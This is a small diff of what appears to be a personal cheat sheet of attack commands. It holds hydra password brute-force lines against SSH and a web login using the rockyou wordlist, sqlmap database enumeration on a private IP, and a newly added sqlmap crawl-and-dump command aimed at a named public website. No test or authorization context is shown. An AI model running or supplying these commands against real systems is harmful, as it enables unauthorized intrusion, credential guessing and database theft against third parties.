@@ -10,4 +10,5 @@ sqlmap -u "http://192.168.1.250/?p=1&forumaction=search" --dbs
 
 hydra -l usuario -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
 
-hydra 127.0.0.1 http-post-form "/index.php:username=^USER^&password=^PASS^:F=Acceso Denegado" -l admin -P /usr/share/wordlists/rockyou.txt -s 8080 -vV
+sqlmap -u "https://www.gamezfull.com/" --crawl=2 --batch --dbs
+
